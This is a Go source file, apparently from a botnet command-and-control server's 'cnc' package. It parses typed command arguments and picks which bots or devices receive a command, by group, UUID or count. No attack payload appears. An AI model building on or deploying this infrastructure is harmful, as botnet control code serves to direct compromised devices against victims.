package command

import (
	"cnc/internal/clients"
	"cnc/internal/database"
	"strconv"
	"strings"
	"time"
)

type Context struct {
	arguments    map[string]*ParsedArgument
	environments map[string]string
	rawArgs      []string
	parent       *Command
}

func (ctx *Context) String(name string) (string, error) {
	value, err := ctx.get(name, ArgumentString)
	if err != nil {
		return "", err
	}

	return value.(string), nil
}

func (ctx *Context) Integer(name string) (int, error) {
	value, err := ctx.get(name, ArgumentInteger)
	if err != nil {
		return 0, err
	}

	return value.(int), nil
}

func (ctx *Context) Boolean(name string) (bool, error) {
	value, err := ctx.get(name, ArgumentBoolean)
	if err != nil {
		return false, err
	}

	return value.(bool), nil
}

func (ctx *Context) User(name string) (*database.UserProfile, error) {
	value, err := ctx.get(name, ArgumentUser)
	if err != nil {
		return nil, err
	}

	return value.(*database.UserProfile), nil
}

func (ctx *Context) Time(name string) (time.Duration, error) {
	value, err := ctx.get(name, ArgumentTime)
	if err != nil {
		return 1 * time.Second, err
	}

	return value.(time.Duration), nil
}

func (ctx *Context) Env(name string) (string, error) {
	value, ok := ctx.environments[name]
	if !ok {
		return "", ErrArgumentNotRegistered
	}

	return value, nil
}

func (ctx *Context) ParseBotOptions() (limitations *clients.Limitation, err error) {
	limitations = new(clients.Limitation)
	limitations.Group = make([]string, 0)
	limitations.UUID = make([]string, 0)
	limitations.Count = 0

	// groups of the bots to send to
	if data, ok := ctx.environments["group"]; ok {
		limitations.Group = strings.Split(data, ",")
	}

	// uuids of the bots to send to
	if data, ok := ctx.environments["uuid"]; ok {
		limitations.UUID = strings.Split(data, ",")
	}

	// count of the devices to send to
	if data, ok := ctx.environments["count"]; ok {
		limitations.Count, err = strconv.Atoi(data)
	}

	return limitations, err
}

// get gets value(s) from a name
func (ctx *Context) get(name string, typeToGet ArgumentType) (any, error) {
	parsedArgument, exists := ctx.arguments[name]

	if !exists {
		return "", ErrArgumentNotRegistered
	}

	if parsedArgument.Type != typeToGet {
		return "", ErrArgumentInvalidType
	}

	return parsedArgument.Value, nil
}

func (ctx *Context) ParsedCount() int {
	return len(ctx.arguments)
}

func (ctx *Context) Count() int {
	return len(ctx.rawArgs)
}

func (ctx *Context) Parent() *Command {
	return ctx.parent
}
